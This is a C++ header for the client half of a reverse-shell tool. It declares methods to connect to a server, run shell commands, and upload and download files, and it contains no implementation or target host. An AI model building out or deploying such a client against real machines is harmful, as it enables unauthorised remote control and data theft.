#pragma once 
#define _WIN32_WINDOWS 0x0A00
#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include "ReverseShellStandardFunctions.h"

class Client : private ReverseShellStandard
{
public:
	Client();

private:
	void Connect() override final;
	void Start();
	OperationType ReadOperationType() override final;
	void RunCommand() override final;
	std::string RunShellCommand(const std::string& command);
	void UploadFile() override final;
	void DownloadFile() override final;
	bool TellServerIfFileExists(const std::string& filePath);
	void InvalidOperation() override final;
};
